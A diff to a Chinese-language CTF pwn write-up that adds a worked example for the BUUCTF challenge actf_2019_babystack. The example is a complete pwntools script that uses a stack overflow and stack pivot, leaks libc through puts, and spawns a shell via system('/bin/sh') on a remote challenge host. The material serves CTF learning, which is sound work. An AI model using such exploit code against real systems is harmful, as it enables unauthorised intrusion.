@@ -2649,7 +2649,7 @@ if __name__ == "__main__":
     main()
 ```
 
-#### gyctf_2020_borrowstack
+#### 例题 3：gyctf_2020_borrowstack
 
 [BUU CTF 题目链接](https://buuoj.cn/challenges#gyctf_2020_borrowstack)
 
@@ -2715,5 +2715,86 @@ def main():
 
 if __name__ == "__main__":
     main()
+```
+
+#### 例题 4：actf_2019_babystack
+
+[BUU CTF 题目链接](https://buuoj.cn/challenges#actf_2019_babystack)
+
+<img width="2556" height="970" alt="image" src="https://github.com/user-attachments/assets/65c005a8-f2a2-4b41-aa70-f80fef5ced3b" />
+
+大概意思就是，程序运行时会倒数 0x3C 秒，在这个时间内要 getshell。
+
+第一个问你输入的大小，不允许超过 0xE0，而 padding 大小 0xD0，明显栈溢出。
+
+依旧没有 system，要先 ret2libc。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'amd64',log_level = 'debug')
+# context.terminal = ['tmux', 'splitw', '-h']
+
+host = "node5.buuoj.cn"
+port = 26174
+io = remote(host,port)
+# io = process("./ACTF_2019_babystack")
+elf = ELF("./ACTF_2019_babystack")
+libc = ELF("./libc-2.27.so")
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+leave_ret = 0x400a18
+pop_rdi_ret = 0x400ad3
+ret = 0x400ad4
+main_addr = 0x4008F6
+
+def main():
+    io.recvuntil(b"Welcome to ACTF's babystack!\n")
+    io.recvuntil(b"How many bytes of your message?\n")
+    io.sendline(b"224")     # 0xE0
+   # gdb.attach(io)
+    io.recvuntil(b">Your message will be saved at ")
+    leak_data = io.recvline().strip(b'\n')
+    leak_stack = int(leak_data,16)
+    print("\n[+]Leak stack:",hex(leak_stack))
+    io.recvuntil(b"What is the content of your message?\n")
+    io.recvuntil(b">")
+    payload_1 = b'A'*0xA0 + b'B'*0x8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr) 
+    payload_1 = payload_1.ljust(0xD0,b'\x00')
+    payload_1 += p64(leak_stack + 0xA0) + p64(leave_ret)
+    
+    # gdb.attach(io)
+    # pause()
+    io.send(payload_1)
+    io.recvuntil(b"Byebye~\n")
+    leak_data = io.recvline().strip(b'\n')
+    leak_data = leak_data.ljust(8,b"\x00")
+    puts_addr = u64(leak_data)
+    print("\n[+]Leak puts:",hex(puts_addr))
+    libc_base = puts_addr - libc.sym['puts']
+    print("\n[+]Leak libcbase:",hex(libc_base))
+    system = libc_base + libc.sym['system']
+    binsh = libc_base + next(libc.search(b'/bin/sh'))
+    io.recvuntil(b"Welcome to ACTF's babystack!\n")
+    io.recvuntil(b"How many bytes of your message?\n")
+    io.sendline(b"224")     # 0xE0
+    io.recvuntil(b">Your message will be saved at ")
+    leak_data = io.recvline().strip(b'\n')
+    leak_stack = int(leak_data,16)
+    print("\n[+]Leak stack:",hex(leak_stack))
+    io.recvuntil(b"What is the content of your message?\n")
+    io.recvuntil(b">")
+    payload_2 = b'A'*0xA0 + b'B'*0x8 + p64(ret) + p64(pop_rdi_ret) + p64(binsh) + p64(system) + p64(0) 
+    payload_2 = payload_2.ljust(0xD0,b'\x00')
+    payload_2 += p64(leak_stack + 0xA0) + p64(leave_ret)
+    # gdb.attach(io)
+    # pause()
+    io.send(payload_2)
+    io.interactive()
+
+
+if __name__ == "__main__":
+    main()
+
 ```
 
